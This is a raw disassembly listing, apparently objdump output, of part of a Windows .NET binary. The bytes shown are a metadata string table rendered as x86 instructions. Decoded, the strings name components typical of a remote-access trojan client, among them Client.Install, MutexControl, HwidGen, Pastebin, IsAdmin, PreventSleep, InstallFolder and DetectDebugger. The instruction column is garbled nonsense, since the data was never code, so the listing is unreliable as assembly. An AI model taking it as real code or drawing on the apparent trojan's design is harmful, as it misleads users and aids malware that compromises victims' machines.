  40871c:	74 5f                	je     0x40877d
  40871e:	49                   	dec    %ecx
  40871f:	6e                   	outsb  %ds:(%esi),(%dx)
  408720:	74 65                	je     0x408787
  408722:	72 76                	jb     0x40879a
  408724:	61                   	popa
  408725:	6c                   	insb   (%dx),%es:(%edi)
  408726:	00 43 6c             	add    %al,0x6c(%ebx)
  408729:	69 65 6e 74 2e 49 6e 	imul   $0x6e492e74,0x6e(%ebp),%esp
  408730:	73 74                	jae    0x4087a6
  408732:	61                   	popa
  408733:	6c                   	insb   (%dx),%es:(%edi)
  408734:	6c                   	insb   (%dx),%es:(%edi)
  408735:	00 6b 65             	add    %ch,0x65(%ebx)
  408738:	72 6e                	jb     0x4087a8
  40873a:	65 6c                	gs insb (%dx),%es:(%edi)
  40873c:	33 32                	xor    (%edx),%esi
  40873e:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408741:	6c                   	insb   (%dx),%es:(%edi)
  408742:	00 75 73             	add    %dh,0x73(%ebp)
  408745:	65 72 33             	gs jb  0x40877b
  408748:	32 2e                	xor    (%esi),%ch
  40874a:	64 6c                	fs insb (%dx),%es:(%edi)
  40874c:	6c                   	insb   (%dx),%es:(%edi)
  40874d:	00 6e 74             	add    %ch,0x74(%esi)
  408750:	64 6c                	fs insb (%dx),%es:(%edi)
  408752:	6c                   	insb   (%dx),%es:(%edi)
  408753:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408756:	6c                   	insb   (%dx),%es:(%edi)
  408757:	00 4b 69             	add    %cl,0x69(%ebx)
  40875a:	6c                   	insb   (%dx),%es:(%edi)
  40875b:	6c                   	insb   (%dx),%es:(%edi)
  40875c:	00 50 6f             	add    %dl,0x6f(%eax)
  40875f:	6c                   	insb   (%dx),%es:(%edi)
  408760:	6c                   	insb   (%dx),%es:(%edi)
  408761:	00 57 72             	add    %dl,0x72(%edi)
  408764:	69 74 65 4e 75 6c 6c 	imul   $0x6c6c75,0x4e(%ebp,%eiz,2),%esi
  40876b:	00 
  40876c:	53                   	push   %ebx
  40876d:	65 74 41             	gs je  0x4087b1
  408770:	73 4e                	jae    0x4087c0
  408772:	75 6c                	jne    0x4087e0
  408774:	6c                   	insb   (%dx),%es:(%edi)
  408775:	00 4d 75             	add    %cl,0x75(%ebp)
  408778:	74 65                	je     0x4087df
  40877a:	78 43                	js     0x4087bf
  40877c:	6f                   	outsl  %ds:(%esi),(%dx)
  40877d:	6e                   	outsb  %ds:(%esi),(%dx)
  40877e:	74 72                	je     0x4087f2
  408780:	6f                   	outsl  %ds:(%esi),(%dx)
  408781:	6c                   	insb   (%dx),%es:(%edi)
  408782:	00 45 6e             	add    %al,0x6e(%ebp)
  408785:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408788:	65 32 53 74          	xor    %gs:0x74(%ebx),%dl
  40878c:	72 65                	jb     0x4087f3
  40878e:	61                   	popa
  40878f:	6d                   	insl   (%dx),%es:(%edi)
  408790:	00 46 69             	add    %al,0x69(%esi)
  408793:	6c                   	insb   (%dx),%es:(%edi)
  408794:	65 53                	gs push %ebx
  408796:	74 72                	je     0x40880a
  408798:	65 61                	gs popa
  40879a:	6d                   	insl   (%dx),%es:(%edi)
  40879b:	00 4e 65             	add    %cl,0x65(%esi)
  40879e:	74 77                	je     0x408817
  4087a0:	6f                   	outsl  %ds:(%esi),(%dx)
  4087a1:	72 6b                	jb     0x40880e
  4087a3:	53                   	push   %ebx
  4087a4:	74 72                	je     0x408818
  4087a6:	65 61                	gs popa
  4087a8:	6d                   	insl   (%dx),%es:(%edi)
  4087a9:	00 53 73             	add    %dl,0x73(%ebx)
  4087ac:	6c                   	insb   (%dx),%es:(%edi)
  4087ad:	53                   	push   %ebx
  4087ae:	74 72                	je     0x408822
  4087b0:	65 61                	gs popa
  4087b2:	6d                   	insl   (%dx),%es:(%edi)
  4087b3:	00 44 65 63          	add    %al,0x63(%ebp,%eiz,2)
  4087b7:	6f                   	outsl  %ds:(%esi),(%dx)
  4087b8:	64 65 46             	fs gs inc %esi
  4087bb:	72 6f                	jb     0x40882c
  4087bd:	6d                   	insl   (%dx),%es:(%edi)
  4087be:	53                   	push   %ebx
  4087bf:	74 72                	je     0x408833
  4087c1:	65 61                	gs popa
  4087c3:	6d                   	insl   (%dx),%es:(%edi)
  4087c4:	00 43 72             	add    %al,0x72(%ebx)
  4087c7:	79 70                	jns    0x408839
  4087c9:	74 6f                	je     0x40883a
  4087cb:	53                   	push   %ebx
  4087cc:	74 72                	je     0x408840
  4087ce:	65 61                	gs popa
  4087d0:	6d                   	insl   (%dx),%es:(%edi)
  4087d1:	00 47 5a             	add    %al,0x5a(%edi)
  4087d4:	69 70 53 74 72 65 61 	imul   $0x61657274,0x53(%eax),%esi
  4087db:	6d                   	insl   (%dx),%es:(%edi)
  4087dc:	00 4d 65             	add    %cl,0x65(%ebp)
  4087df:	6d                   	insl   (%dx),%es:(%edi)
  4087e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4087e1:	72 79                	jb     0x40885c
  4087e3:	53                   	push   %ebx
  4087e4:	74 72                	je     0x408858
  4087e6:	65 61                	gs popa
  4087e8:	6d                   	insl   (%dx),%es:(%edi)
  4087e9:	00 50 72             	add    %dl,0x72(%eax)
  4087ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4087ed:	67 72 61             	addr16 jb 0x408851
  4087f0:	6d                   	insl   (%dx),%es:(%edi)
  4087f1:	00 67 65             	add    %ah,0x65(%edi)
  4087f4:	74 5f                	je     0x408855
  4087f6:	49                   	dec    %ecx
  4087f7:	74 65                	je     0x40885e
  4087f9:	6d                   	insl   (%dx),%es:(%edi)
  4087fa:	00 67 65             	add    %ah,0x65(%edi)
  4087fd:	74 5f                	je     0x40885e
  4087ff:	49                   	dec    %ecx
  408800:	73 36                	jae    0x408838
  408802:	34 42                	xor    $0x42,%al
  408804:	69 74 4f 70 65 72 61 	imul   $0x74617265,0x70(%edi,%ecx,2),%esi
  40880b:	74 
  40880c:	69 6e 67 53 79 73 74 	imul   $0x74737953,0x67(%esi),%ebp
  408813:	65 6d                	gs insl (%dx),%es:(%edi)
  408815:	00 43 6c             	add    %al,0x6c(%ebx)
  408818:	69 65 6e 74 2e 41 6c 	imul   $0x6c412e74,0x6e(%ebp),%esp
  40881f:	67 6f                	outsl  %ds:(%si),(%dx)
  408821:	72 69                	jb     0x40888c
  408823:	74 68                	je     0x40888d
  408825:	6d                   	insl   (%dx),%es:(%edi)
  408826:	00 53 79             	add    %dl,0x79(%ebx)
  408829:	6d                   	insl   (%dx),%es:(%edi)
  40882a:	6d                   	insl   (%dx),%es:(%edi)
  40882b:	65 74 72             	gs je  0x4088a0
  40882e:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  408835:	69 74 68 6d 00 41 73 	imul   $0x79734100,0x6d(%eax,%ebp,2),%esi
  40883c:	79 
  40883d:	6d                   	insl   (%dx),%es:(%edi)
  40883e:	6d                   	insl   (%dx),%es:(%edi)
  40883f:	65 74 72             	gs je  0x4088b4
  408842:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  408849:	69 74 68 6d 00 48 61 	imul   $0x73614800,0x6d(%eax,%ebp,2),%esi
  408850:	73 
  408851:	68 41 6c 67 6f       	push   $0x6f676c41
  408856:	72 69                	jb     0x4088c1
  408858:	74 68                	je     0x4088c2
  40885a:	6d                   	insl   (%dx),%es:(%edi)
  40885b:	00 54 72 69          	add    %dl,0x69(%edx,%esi,2)
  40885f:	6d                   	insl   (%dx),%es:(%edi)
  408860:	00 52 61             	add    %dl,0x61(%edx)
  408863:	6e                   	outsb  %ds:(%esi),(%dx)
  408864:	64 6f                	outsl  %fs:(%esi),(%dx)
  408866:	6d                   	insl   (%dx),%es:(%edi)
  408867:	00 49 43             	add    %cl,0x43(%ecx)
  40886a:	72 79                	jb     0x4088e5
  40886c:	70 74                	jo     0x4088e2
  40886e:	6f                   	outsl  %ds:(%esi),(%dx)
  40886f:	54                   	push   %esp
  408870:	72 61                	jb     0x4088d3
  408872:	6e                   	outsb  %ds:(%esi),(%dx)
  408873:	73 66                	jae    0x4088db
  408875:	6f                   	outsl  %ds:(%esi),(%dx)
  408876:	72 6d                	jb     0x4088e5
  408878:	00 4d 73             	add    %cl,0x73(%ebp)
  40887b:	67 50                	addr16 push %eax
  40887d:	61                   	popa
  40887e:	63 6b 45             	arpl   %ebp,0x45(%ebx)
  408881:	6e                   	outsb  %ds:(%esi),(%dx)
  408882:	75 6d                	jne    0x4088f1
  408884:	00 57 72             	add    %dl,0x72(%edi)
  408887:	69 74 65 42 6f 6f 6c 	imul   $0x656c6f6f,0x42(%ebp,%eiz,2),%esi
  40888e:	65 
  40888f:	61                   	popa
  408890:	6e                   	outsb  %ds:(%esi),(%dx)
  408891:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  408895:	6f                   	outsl  %ds:(%esi),(%dx)
  408896:	6f                   	outsl  %ds:(%esi),(%dx)
  408897:	6c                   	insb   (%dx),%es:(%edi)
  408898:	65 61                	gs popa
  40889a:	6e                   	outsb  %ds:(%esi),(%dx)
  40889b:	00 53 65             	add    %dl,0x65(%ebx)
  40889e:	74 41                	je     0x4088e1
  4088a0:	73 42                	jae    0x4088e4
  4088a2:	6f                   	outsl  %ds:(%esi),(%dx)
  4088a3:	6f                   	outsl  %ds:(%esi),(%dx)
  4088a4:	6c                   	insb   (%dx),%es:(%edi)
  4088a5:	65 61                	gs popa
  4088a7:	6e                   	outsb  %ds:(%esi),(%dx)
  4088a8:	00 48 77             	add    %cl,0x77(%eax)
  4088ab:	69 64 47 65 6e 00 6c 	imul   $0x656c006e,0x65(%edi,%eax,2),%esp
  4088b2:	65 
  4088b3:	6e                   	outsb  %ds:(%esi),(%dx)
  4088b4:	00 63 68             	add    %ah,0x68(%ebx)
  4088b7:	69 6c 64 72 65 6e 00 	imul   $0x4d006e65,0x72(%esp,%eiz,2),%ebp
  4088be:	4d 
  4088bf:	61                   	popa
  4088c0:	69 6e 00 58 35 30 39 	imul   $0x39303558,0x0(%esi),%ebp
  4088c7:	43                   	inc    %ebx
  4088c8:	68 61 69 6e 00       	push   $0x6e6961
  4088cd:	63 68 61             	arpl   %ebp,0x61(%eax)
  4088d0:	69 6e 00 41 70 70 44 	imul   $0x44707041,0x0(%esi),%ebp
  4088d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4088d8:	6d                   	insl   (%dx),%es:(%edi)
  4088d9:	61                   	popa
  4088da:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  4088e1:	43                   	inc    %ebx
  4088e2:	75 72                	jne    0x408956
  4088e4:	72 65                	jb     0x40894b
  4088e6:	6e                   	outsb  %ds:(%esi),(%dx)
  4088e7:	74 44                	je     0x40892d
  4088e9:	6f                   	outsl  %ds:(%esi),(%dx)
  4088ea:	6d                   	insl   (%dx),%es:(%edi)
  4088eb:	61                   	popa
  4088ec:	69 6e 00 50 61 73 74 	imul   $0x74736150,0x0(%esi),%ebp
  4088f3:	65 62 69 6e          	bound  %ebp,%gs:0x6e(%ecx)
  4088f7:	00 49 73             	add    %cl,0x73(%ecx)
  4088fa:	41                   	inc    %ecx
  4088fb:	64 6d                	fs insl (%dx),%es:(%edi)
  4088fd:	69 6e 00 4a 6f 69 6e 	imul   $0x6e696f4a,0x0(%esi),%ebp
  408904:	00 47 65             	add    %al,0x65(%edi)
  408907:	74 46                	je     0x40894f
  408909:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
  408910:	57 
  408911:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
  408918:	78 
  408919:	74 65                	je     0x408980
  40891b:	6e                   	outsb  %ds:(%esi),(%dx)
  40891c:	73 69                	jae    0x408987
  40891e:	6f                   	outsl  %ds:(%esi),(%dx)
  40891f:	6e                   	outsb  %ds:(%esi),(%dx)
  408920:	00 67 65             	add    %ah,0x65(%edi)
  408923:	74 5f                	je     0x408984
  408925:	4f                   	dec    %edi
  408926:	53                   	push   %ebx
  408927:	56                   	push   %esi
  408928:	65 72 73             	gs jb  0x40899e
  40892b:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  408932:	74 65                	je     0x408999
  408934:	6d                   	insl   (%dx),%es:(%edi)
  408935:	2e 49                	cs dec %ecx
  408937:	4f                   	dec    %edi
  408938:	2e 43                	cs inc %ebx
  40893a:	6f                   	outsl  %ds:(%esi),(%dx)
  40893b:	6d                   	insl   (%dx),%es:(%edi)
  40893c:	70 72                	jo     0x4089b0
  40893e:	65 73 73             	gs jae 0x4089b4
  408941:	69 6f 6e 00 41 70 70 	imul   $0x70704100,0x6e(%edi),%ebp
  408948:	6c                   	insb   (%dx),%es:(%edi)
  408949:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  408950:	00 53 79             	add    %dl,0x79(%ebx)
  408953:	73 74                	jae    0x4089c9
  408955:	65 6d                	gs insl (%dx),%es:(%edi)
  408957:	2e 53                	cs push %ebx
  408959:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  40895d:	69 74 79 2e 41 75 74 	imul   $0x68747541,0x2e(%ecx,%edi,2),%esi
  408964:	68 
  408965:	65 6e                	outsb  %gs:(%esi),(%dx)
  408967:	74 69                	je     0x4089d2
  408969:	63 61 74             	arpl   %esp,0x74(%ecx)
  40896c:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  408973:	74 65                	je     0x4089da
  408975:	6d                   	insl   (%dx),%es:(%edi)
  408976:	2e 52                	cs push %edx
  408978:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  40897b:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408980:	6e                   	outsb  %ds:(%esi),(%dx)
  408981:	00 58 35             	add    %bl,0x35(%eax)
  408984:	30 39                	xor    %bh,(%ecx)
  408986:	43                   	inc    %ebx
  408987:	65 72 74             	gs jb  0x4089fe
  40898a:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408991:	43                   	inc    %ebx
  408992:	6f                   	outsl  %ds:(%esi),(%dx)
  408993:	6c                   	insb   (%dx),%es:(%edi)
  408994:	6c                   	insb   (%dx),%es:(%edi)
  408995:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40899a:	6e                   	outsb  %ds:(%esi),(%dx)
  40899b:	00 4d 61             	add    %cl,0x61(%ebp)
  40899e:	6e                   	outsb  %ds:(%esi),(%dx)
  40899f:	61                   	popa
  4089a0:	67 65 6d             	gs insl (%dx),%es:(%di)
  4089a3:	65 6e                	outsb  %gs:(%esi),(%dx)
  4089a5:	74 4f                	je     0x4089f6
  4089a7:	62 6a 65             	bound  %ebp,0x65(%edx)
  4089aa:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  4089ae:	6c                   	insb   (%dx),%es:(%edi)
  4089af:	6c                   	insb   (%dx),%es:(%edi)
  4089b0:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4089b5:	6e                   	outsb  %ds:(%esi),(%dx)
  4089b6:	00 43 6c             	add    %al,0x6c(%ebx)
  4089b9:	69 65 6e 74 2e 43 6f 	imul   $0x6f432e74,0x6e(%ebp),%esp
  4089c0:	6e                   	outsb  %ds:(%esi),(%dx)
  4089c1:	6e                   	outsb  %ds:(%esi),(%dx)
  4089c2:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4089c7:	6e                   	outsb  %ds:(%esi),(%dx)
  4089c8:	00 73 65             	add    %dh,0x65(%ebx)
  4089cb:	74 5f                	je     0x408a2c
  4089cd:	50                   	push   %eax
  4089ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4089cf:	73 69                	jae    0x408a3a
  4089d1:	74 69                	je     0x408a3c
  4089d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4089d4:	6e                   	outsb  %ds:(%esi),(%dx)
  4089d5:	00 70 6f             	add    %dh,0x6f(%eax)
  4089d8:	73 69                	jae    0x408a43
  4089da:	74 69                	je     0x408a45
  4089dc:	6f                   	outsl  %ds:(%esi),(%dx)
  4089dd:	6e                   	outsb  %ds:(%esi),(%dx)
  4089de:	00 43 72             	add    %al,0x72(%ebx)
  4089e1:	79 70                	jns    0x408a53
  4089e3:	74 6f                	je     0x408a54
  4089e5:	67 72 61             	addr16 jb 0x408a49
  4089e8:	70 68                	jo     0x408a52
  4089ea:	69 63 45 78 63 65 70 	imul   $0x70656378,0x45(%ebx),%esp
  4089f1:	74 69                	je     0x408a5c
  4089f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4089f4:	6e                   	outsb  %ds:(%esi),(%dx)
  4089f5:	00 41 72             	add    %al,0x72(%ecx)
  4089f8:	67 75 6d             	addr16 jne 0x408a68
  4089fb:	65 6e                	outsb  %gs:(%esi),(%dx)
  4089fd:	74 4e                	je     0x408a4d
  4089ff:	75 6c                	jne    0x408a6d
  408a01:	6c                   	insb   (%dx),%es:(%edi)
  408a02:	45                   	inc    %ebp
  408a03:	78 63                	js     0x408a68
  408a05:	65 70 74             	gs jo  0x408a7c
  408a08:	69 6f 6e 00 41 72 67 	imul   $0x67724100,0x6e(%edi),%ebp
  408a0f:	75 6d                	jne    0x408a7e
  408a11:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a13:	74 45                	je     0x408a5a
  408a15:	78 63                	js     0x408a7a
  408a17:	65 70 74             	gs jo  0x408a8e
  408a1a:	69 6f 6e 00 55 6e 6b 	imul   $0x6b6e5500,0x6e(%edi),%ebp
  408a21:	6e                   	outsb  %ds:(%esi),(%dx)
  408a22:	6f                   	outsl  %ds:(%esi),(%dx)
  408a23:	77 6e                	ja     0x408a93
  408a25:	00 49 6d             	add    %cl,0x6d(%ecx)
  408a28:	61                   	popa
  408a29:	67 65 43             	addr16 gs inc %ebx
  408a2c:	6f                   	outsl  %ds:(%esi),(%dx)
  408a2d:	64 65 63 49 6e       	fs arpl %ecx,%gs:0x6e(%ecx)
  408a32:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a34:	00 53 65             	add    %dl,0x65(%ebx)
  408a37:	6e                   	outsb  %ds:(%esi),(%dx)
  408a38:	64 49                	fs dec %ecx
  408a3a:	6e                   	outsb  %ds:(%esi),(%dx)
  408a3b:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a3d:	00 46 69             	add    %al,0x69(%esi)
  408a40:	6c                   	insb   (%dx),%es:(%edi)
  408a41:	65 49                	gs dec %ecx
  408a43:	6e                   	outsb  %ds:(%esi),(%dx)
  408a44:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a46:	00 44 72 69          	add    %al,0x69(%edx,%esi,2)
  408a4a:	76 65                	jbe    0x408ab1
  408a4c:	49                   	dec    %ecx
  408a4d:	6e                   	outsb  %ds:(%esi),(%dx)
  408a4e:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a50:	00 46 69             	add    %al,0x69(%esi)
  408a53:	6c                   	insb   (%dx),%es:(%edi)
  408a54:	65 53                	gs push %ebx
  408a56:	79 73                	jns    0x408acb
  408a58:	74 65                	je     0x408abf
  408a5a:	6d                   	insl   (%dx),%es:(%edi)
  408a5b:	49                   	dec    %ecx
  408a5c:	6e                   	outsb  %ds:(%esi),(%dx)
  408a5d:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a5f:	00 43 6f             	add    %al,0x6f(%ebx)
  408a62:	6d                   	insl   (%dx),%es:(%edi)
  408a63:	70 75                	jo     0x408ada
  408a65:	74 65                	je     0x408acc
  408a67:	72 49                	jb     0x408ab2
  408a69:	6e                   	outsb  %ds:(%esi),(%dx)
  408a6a:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a6c:	00 43 53             	add    %al,0x53(%ebx)
  408a6f:	68 61 72 70 41       	push   $0x41707261
  408a74:	72 67                	jb     0x408add
  408a76:	75 6d                	jne    0x408ae5
  408a78:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a7a:	74 49                	je     0x408ac5
  408a7c:	6e                   	outsb  %ds:(%esi),(%dx)
  408a7d:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a7f:	00 50 72             	add    %dl,0x72(%eax)
  408a82:	6f                   	outsl  %ds:(%esi),(%dx)
  408a83:	63 65 73             	arpl   %esp,0x73(%ebp)
  408a86:	73 53                	jae    0x408adb
  408a88:	74 61                	je     0x408aeb
  408a8a:	72 74                	jb     0x408b00
  408a8c:	49                   	dec    %ecx
  408a8d:	6e                   	outsb  %ds:(%esi),(%dx)
  408a8e:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a90:	00 47 6f             	add    %al,0x6f(%edi)
  408a93:	6f                   	outsl  %ds:(%esi),(%dx)
  408a94:	67 6c                	insb   (%dx),%es:(%di)
  408a96:	65 20 45 61          	and    %al,%gs:0x61(%ebp)
  408a9a:	72 74                	jb     0x408b10
  408a9c:	68 20 50 72 6f       	push   $0x6f725020
  408aa1:	00 57 72             	add    %dl,0x72(%edi)
  408aa4:	69 74 65 4d 61 70 00 	imul   $0x50007061,0x4d(%ebp,%eiz,2),%esi
  408aab:	50 
  408aac:	72 65                	jb     0x408b13
  408aae:	76 65                	jbe    0x408b15
  408ab0:	6e                   	outsb  %ds:(%esi),(%dx)
  408ab1:	74 53                	je     0x408b06
  408ab3:	6c                   	insb   (%dx),%es:(%edi)
  408ab4:	65 65 70 00          	gs gs jo 0x408ab8
  408ab8:	5a                   	pop    %edx
  408ab9:	69 70 00 63 75 72 72 	imul   $0x72727563,0x0(%eax),%esi
  408ac0:	65 6e                	outsb  %gs:(%esi),(%dx)
  408ac2:	74 41                	je     0x408b05
  408ac4:	70 70                	jo     0x408b36
  408ac6:	00 4d 69             	add    %cl,0x69(%ebp)
  408ac9:	63 72 6f             	arpl   %esi,0x6f(%edx)
  408acc:	73 6f                	jae    0x408b3d
  408ace:	66 74 2e             	data16 je 0x408aff
  408ad1:	43                   	inc    %ebx
  408ad2:	53                   	push   %ebx
  408ad3:	68 61 72 70 00       	push   $0x707261
  408ad8:	47                   	inc    %edi
  408ad9:	72 6f                	jb     0x408b4a
  408adb:	75 70                	jne    0x408b4d
  408add:	00 4e 6f             	add    %cl,0x6f(%esi)
  408ae0:	72 6d                	jb     0x408b4f
  408ae2:	61                   	popa
  408ae3:	6c                   	insb   (%dx),%es:(%edi)
  408ae4:	53                   	push   %ebx
  408ae5:	74 61                	je     0x408b48
  408ae7:	72 74                	jb     0x408b5d
  408ae9:	75 70                	jne    0x408b5b
  408aeb:	00 53 79             	add    %dl,0x79(%ebx)
  408aee:	73 74                	jae    0x408b64
  408af0:	65 6d                	gs insl (%dx),%es:(%edi)
  408af2:	2e 4c                	cs dec %esp
  408af4:	69 6e 71 00 43 6c 65 	imul   $0x656c4300,0x71(%esi),%ebp
  408afb:	61                   	popa
  408afc:	72 00                	jb     0x408afe
  408afe:	43                   	inc    %ebx
  408aff:	68 61 72 00 49       	push   $0x49007261
  408b04:	6e                   	outsb  %ds:(%esi),(%dx)
  408b05:	76 6f                	jbe    0x408b76
  408b07:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  408b0b:	6d                   	insl   (%dx),%es:(%edi)
  408b0c:	62 65 72             	bound  %esp,0x72(%ebp)
  408b0f:	00 4d 44             	add    %cl,0x44(%ebp)
  408b12:	35 43 72 79 70       	xor    $0x70797243,%eax
  408b17:	74 6f                	je     0x408b88
  408b19:	53                   	push   %ebx
  408b1a:	65 72 76             	gs jb  0x408b93
  408b1d:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  408b24:	69 64 65 72 00 52 53 	imul   $0x41535200,0x72(%ebp,%eiz,2),%esp
  408b2b:	41 
  408b2c:	43                   	inc    %ebx
  408b2d:	72 79                	jb     0x408ba8
  408b2f:	70 74                	jo     0x408ba5
  408b31:	6f                   	outsl  %ds:(%esi),(%dx)
  408b32:	53                   	push   %ebx
  408b33:	65 72 76             	gs jb  0x408bac
  408b36:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  408b3d:	69 64 65 72 00 41 65 	imul   $0x73654100,0x72(%ebp,%eiz,2),%esp
  408b44:	73 
  408b45:	43                   	inc    %ebx
  408b46:	72 79                	jb     0x408bc1
  408b48:	70 74                	jo     0x408bbe
  408b4a:	6f                   	outsl  %ds:(%esi),(%dx)
  408b4b:	53                   	push   %ebx
  408b4c:	65 72 76             	gs jb  0x408bc5
  408b4f:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  408b56:	69 64 65 72 00 53 74 	imul   $0x72745300,0x72(%ebp,%eiz,2),%esp
  408b5d:	72 
  408b5e:	69 6e 67 42 75 69 6c 	imul   $0x6c697542,0x67(%esi),%ebp
  408b65:	64 65 72 00          	fs gs jb 0x408b69
  408b69:	49                   	dec    %ecx
  408b6a:	6e                   	outsb  %ds:(%esi),(%dx)
  408b6b:	73 74                	jae    0x408be1
  408b6d:	61                   	popa
  408b6e:	6c                   	insb   (%dx),%es:(%edi)
  408b6f:	6c                   	insb   (%dx),%es:(%edi)
  408b70:	46                   	inc    %esi
  408b71:	6f                   	outsl  %ds:(%esi),(%dx)
  408b72:	6c                   	insb   (%dx),%es:(%edi)
  408b73:	64 65 72 00          	fs gs jb 0x408b77
  408b77:	49                   	dec    %ecx
  408b78:	64 53                	fs push %ebx
  408b7a:	65 6e                	outsb  %gs:(%esi),(%dx)
  408b7c:	64 65 72 00          	fs gs jb 0x408b80
  408b80:	73 65                	jae    0x408be7
  408b82:	6e                   	outsb  %ds:(%esi),(%dx)
  408b83:	64 65 72 00          	fs gs jb 0x408b87
  408b87:	4d                   	dec    %ebp
  408b88:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  408b8f:	74 2e                	je     0x408bbf
  408b91:	43                   	inc    %ebx
  408b92:	53                   	push   %ebx
  408b93:	68 61 72 70 2e       	push   $0x2e707261
  408b98:	52                   	push   %edx
  408b99:	75 6e                	jne    0x408c09
  408b9b:	74 69                	je     0x408c06
  408b9d:	6d                   	insl   (%dx),%es:(%edi)
  408b9e:	65 42                	gs inc %edx
  408ba0:	69 6e 64 65 72 00 43 	imul   $0x43007265,0x64(%esi),%ebp
  408ba7:	61                   	popa
  408ba8:	6c                   	insb   (%dx),%es:(%edi)
  408ba9:	6c                   	insb   (%dx),%es:(%edi)
  408baa:	53                   	push   %ebx
  408bab:	69 74 65 42 69 6e 64 	imul   $0x65646e69,0x42(%ebp,%eiz,2),%esi
  408bb2:	65 
  408bb3:	72 00                	jb     0x408bb5
  408bb5:	47                   	inc    %edi
  408bb6:	65 74 45             	gs je  0x408bfe
  408bb9:	6e                   	outsb  %ds:(%esi),(%dx)
  408bba:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408bbd:	65 72 00             	gs jb  0x408bc0
  408bc0:	67 65 74 5f          	addr16 gs je 0x408c23
  408bc4:	42                   	inc    %edx
  408bc5:	75 66                	jne    0x408c2d
  408bc7:	66 65 72 00          	data16 gs jb 0x408bcb
  408bcb:	73 65                	jae    0x408c32
  408bcd:	74 5f                	je     0x408c2e
  408bcf:	42                   	inc    %edx
  408bd0:	75 66                	jne    0x408c38
  408bd2:	66 65 72 00          	data16 gs jb 0x408bd6
  408bd6:	57                   	push   %edi
  408bd7:	72 69                	jb     0x408c42
  408bd9:	74 65                	je     0x408c40
  408bdb:	49                   	dec    %ecx
  408bdc:	6e                   	outsb  %ds:(%esi),(%dx)
  408bdd:	74 65                	je     0x408c44
  408bdf:	67 65 72 00          	addr16 gs jb 0x408be3
  408be3:	67 65 74 5f          	addr16 gs je 0x408c46
  408be7:	41                   	inc    %ecx
  408be8:	73 49                	jae    0x408c33
  408bea:	6e                   	outsb  %ds:(%esi),(%dx)
  408beb:	74 65                	je     0x408c52
  408bed:	67 65 72 00          	addr16 gs jb 0x408bf1
  408bf1:	73 65                	jae    0x408c58
  408bf3:	74 5f                	je     0x408c54
  408bf5:	41                   	inc    %ecx
  408bf6:	73 49                	jae    0x408c41
  408bf8:	6e                   	outsb  %ds:(%esi),(%dx)
  408bf9:	74 65                	je     0x408c60
  408bfb:	67 65 72 00          	addr16 gs jb 0x408bff
  408bff:	47                   	inc    %edi
  408c00:	65 74 41             	gs je  0x408c44
  408c03:	73 49                	jae    0x408c4e
  408c05:	6e                   	outsb  %ds:(%esi),(%dx)
  408c06:	74 65                	je     0x408c6d
  408c08:	67 65 72 00          	addr16 gs jb 0x408c0c
  408c0c:	53                   	push   %ebx
  408c0d:	65 74 41             	gs je  0x408c51
  408c10:	73 49                	jae    0x408c5b
  408c12:	6e                   	outsb  %ds:(%esi),(%dx)
  408c13:	74 65                	je     0x408c7a
  408c15:	67 65 72 00          	addr16 gs jb 0x408c19
  408c19:	44                   	inc    %esp
  408c1a:	65 74 65             	gs je  0x408c82
  408c1d:	63 74 44 65          	arpl   %esi,0x65(%esp,%eax,2)
  408c21:	62 75 67             	bound  %esi,0x67(%ebp)
  408c24:	67 65 72 00          	addr16 gs jb 0x408c28
  408c28:	4d                   	dec    %ebp
  408c29:	61                   	popa
  408c2a:	6e                   	outsb  %ds:(%esi),(%dx)
  408c2b:	61                   	popa
  408c2c:	67 65 6d             	gs insl (%dx),%es:(%di)
  408c2f:	65 6e                	outsb  %gs:(%esi),(%dx)
  408c31:	74 4f                	je     0x408c82
  408c33:	62 6a 65             	bound  %ebp,0x65(%edx)
  408c36:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  408c3a:	61                   	popa
